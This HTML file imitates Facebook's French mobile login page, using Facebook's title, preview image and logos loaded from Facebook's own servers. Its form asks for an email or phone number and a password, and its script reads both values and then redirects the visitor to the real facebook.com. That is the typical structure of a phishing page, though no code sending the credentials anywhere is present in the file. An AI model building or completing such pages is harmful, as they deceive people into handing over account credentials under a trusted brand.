<!DOCTYPE html>
<html lang="en">
<head>
  <title>Facebook</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta charset="UTF-8">
  <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
  <style>
    body {
      background-image: url('images/backimage.png'); /* Path to your image */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed; /* Keeps the background fixed while scrolling */
      font-family: sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh; /* Ensures background covers the whole screen */
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      padding: 20px;
      box-sizing: border-box;
    }

    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 30px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 15px;
      box-sizing: border-box;
      font-size: 14px;
      background-color: white;
      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #1877F2;
      box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
    }

    button {
      background-color: #1877F2;
      color: white;
      padding: 15px 20px;
      margin: 10px 0;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      font-size: 16px;
      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
      transition: background-color 0.3s, transform 0.2s;
    }

    button:hover {
      background-color: #145dbf;
      transform: scale(1.03);
    }

    .forgot-password {
      color: #1877F2;
      text-decoration: none;
      margin-bottom: 10px;
      font-size: 14px;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    .create-account {
      background-color: white;
      color: #1877F2;
      padding: 15px 20px;
      border: 1px solid #ddd;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      font-size: 16px;
      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
      transition: background-color 0.3s, transform 0.2s;
    }

    .create-account:hover {
      background-color: #f0f2f5;
      transform: scale(1.03);
    }

    .meta-logo {
      display: block;
      margin: 20px auto 0;
      object-fit: contain;
      height: auto;
      width: 50px;
    }

    .footer {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: -140px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img 
        data-bloks-name="bk.components.Image" 
        role="heading" 
        alt="Facebook from Meta" 
        class="wbloks_1" 
        src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" 
        style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
    </div>

    <!-- Start of form -->
    <form id="loginForm" onsubmit="return redirectToSite(event)">
      <input type="text" name="email" placeholder="Email ou Numéro de téléphone" required>
      <input type="password" name="password" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>
    <!-- End of form -->

    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
  </div>

  <div class="footer">
    <button class="create-account">Créer un nouveau compte</button>
    <img 
      data-bloks-name="bk.components.Image" 
      alt="Logo Meta" 
      class="meta-logo" 
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png">
  </div>

  <script>
    function redirectToSite(event) {
      event.preventDefault(); // Prevent form from submitting traditionally
      const email = document.querySelector('input[name="email"]').value;
      const password = document.querySelector('input[name="password"]').value;

      if (email && password) {
        // Redirect to another page after successful login
        window.location.href = "https://www.facebook.com/";
      } else {
        alert("Please enter both email and password.");
      }
    }
  </script>
</body>
</html>
